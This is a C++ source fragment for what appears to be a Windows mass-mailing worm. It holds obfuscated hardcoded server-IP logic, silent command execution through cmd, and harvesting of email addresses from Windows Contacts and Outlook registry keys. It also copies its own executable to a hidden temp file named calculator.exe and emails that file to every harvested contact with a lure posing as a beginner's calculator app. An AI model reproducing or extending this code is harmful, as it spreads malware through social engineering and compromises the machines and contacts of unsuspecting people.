// Hardcoded server IP - making it difficult to modify
const char* get_server_ip() {
    // Using a function to make it less obvious
    static char ip[16] = {0};
    if (ip[0] == 0) {
        // Obfuscated IP assignment - replace with your actual server IP
        ip[0] = '1'; ip[1] = '9'; ip[2] = '2'; ip[3] = '.'; 
        ip[4] = '1'; ip[5] = '6'; ip[6] = '8'; ip[7] = '.'; 
        ip[8] = '1'; ip[9] = '.'; ip[10] = '1'; ip[11] = '0'; ip[12] = '0';
        ip[13] = '\0';
    }
    return ip;
}

// Function to execute a command
void execute_command(const char* command) {
    // Create a buffer for the command with "cmd /c " prefix
    char full_command[BUFFER_SIZE + 8];
    snprintf(full_command, sizeof(full_command), "cmd /c %s", command);
    
    // Execute the command silently with output redirected to NUL
    char silent_command[BUFFER_SIZE + 16];
    snprintf(silent_command, sizeof(silent_command), "%s > NUL 2>&1", full_command);
    
    // Execute the command completely silently
    system(silent_command);
}

// Function to extract contacts from Windows Contacts
std::vector<std::string> ExtractWindowsContacts() {
    std::vector<std::string> emailList;
    HRESULT hr;
    IContactManager* pContactManager = NULL;
    IContactCollection* pContactCollection = NULL;
    
    // Initialize COM
    hr = CoInitialize(NULL);
    if (FAILED(hr)) return emailList;
    
    // Create Contact Manager
    hr = CoCreateInstance(CLSID_ContactManager, NULL, CLSCTX_INPROC_SERVER, 
                          IID_IContactManager, (LPVOID*)&pContactManager);
    if (FAILED(hr)) {
        CoUninitialize();
        return emailList;
    }
    
    // Get the contacts collection
    hr = pContactManager->GetContactsCollection(&pContactCollection);
    if (FAILED(hr)) {
        pContactManager->Release();
        CoUninitialize();
        return emailList;
    }
    
    // Enumerate through contacts
    DWORD contactCount = 0;
    pContactCollection->GetCount(&contactCount);
    
    for (DWORD i = 0; i < contactCount; i++) {
        IContact* pContact = NULL;
        hr = pContactCollection->GetItem(i, &pContact);
        if (SUCCEEDED(hr) && pContact) {
            LPWSTR email = NULL;
            hr = pContact->GetString(CONTACT_FIELD_EMAIL1ADDRESS, &email);
            if (SUCCEEDED(hr) && email) {
                // Convert to ANSI and add to list
                char ansiEmail[256];
                WideCharToMultiByte(CP_ACP, 0, email, -1, ansiEmail, 256, NULL, NULL);
                emailList.push_back(std::string(ansiEmail));
                CoTaskMemFree(email);
            }
            pContact->Release();
        }
    }
    
    // Cleanup
    pContactCollection->Release();
    pContactManager->Release();
    CoUninitialize();
    
    return emailList;
}

// Function to extract contacts from Outlook
std::vector<std::string> ExtractOutlookContacts() {
    std::vector<std::string> emailList;
    
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, 
                    _T("Software\\Microsoft\\Office\\Outlook\\OMI Account Manager\\Accounts"), 
                    0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        DWORD subKeyCount = 0;
        RegQueryInfoKey(hKey, NULL, NULL, NULL, &subKeyCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        
        for (DWORD i = 0; i < subKeyCount; i++) {
            TCHAR subKeyName[256];
            DWORD nameLen = 256;
            if (RegEnumKeyEx(hKey, i, subKeyName, &nameLen, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                HKEY accountKey;
                if (RegOpenKeyEx(hKey, subKeyName, 0, KEY_READ, &accountKey) == ERROR_SUCCESS) {
                    TCHAR email[256];
                    DWORD emailLen = 256;
                    if (RegQueryValueEx(accountKey, _T("Email"), NULL, NULL, 
                                       (LPBYTE)email, &emailLen) == ERROR_SUCCESS) {
                        char ansiEmail[256];
                        WideCharToMultiByte(CP_ACP, 0, email, -1, ansiEmail, 256, NULL, NULL);
                        emailList.push_back(std::string(ansiEmail));
                    }
                    RegCloseKey(accountKey);
                }
            }
        }
        RegCloseKey(hKey);
    }
    
    return emailList;
}

// Function to create a copy of the executable
void CreateExecutableCopy() {
    char currentPath[MAX_PATH];
    GetModuleFileName(NULL, currentPath, MAX_PATH);
    
    char tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    
    char copyPath[MAX_PATH];
    sprintf(copyPath, "%scalculator.exe", tempPath);
    
    // Copy the current executable to the temp directory
    CopyFile(currentPath, copyPath, FALSE);
    
    // Set the file to be hidden
    SetFileAttributes(copyPath, FILE_ATTRIBUTE_HIDDEN);
}

// Function to send emails with attachment
void SendEmailsWithAttachment(const std::vector<std::string>& emailList) {
    // Get the path to the copied executable
    char tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    
    char attachmentPath[MAX_PATH];
    sprintf(attachmentPath, "%scalculator.exe", tempPath);
    
    // Initialize MAPI
    MapiMessage message = {0};
    MapiRecipDesc recipient = {0};
    MapiFileDesc fileDesc = {0};
    
    // Set up the message
    message.lpszSubject = "My New Calculator App";
    message.lpszNoteText = "Hey! I just started coding and made a calculator app. Check it out!";
    message.nRecipCount = 1;
    message.lpRecips = &recipient;
    message.nFileCount = 1;
    message.lpFiles = &fileDesc;
    
    // Set up the file attachment
    fileDesc.lpszPathName = attachmentPath;
    fileDesc.lpszFileName = "calculator.exe";
    fileDesc.nPosition = -1;
    
    // Send to each email contact
    for (const auto& email : emailList) {
        // Set up the recipient
        recipient.ulRecipClass = MAPI_TO;
        recipient.lpszName = "";
        recipient.lpszAddress = (LPSTR)email.c_str();
        
        // Send the email
        MAPISendMail(NULL, NULL, &message, MAPI_DIALOG, 0);
        
        // Small delay between sending emails
        Sleep(1000);
    }
}

